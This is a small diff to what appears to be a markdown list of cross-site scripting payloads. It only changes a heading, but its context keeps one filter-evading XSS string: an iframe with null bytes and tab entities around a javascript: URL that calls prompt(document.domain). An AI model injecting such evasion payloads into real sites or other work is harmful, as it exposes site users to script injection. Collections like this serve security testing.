@@ -1,4 +1,4 @@
-# Same xss payloads
+# Same xss payload
 
 ```
 <iframe %00 src="&Tab;javascript:prompt(document.domain)&Tab;"%00>
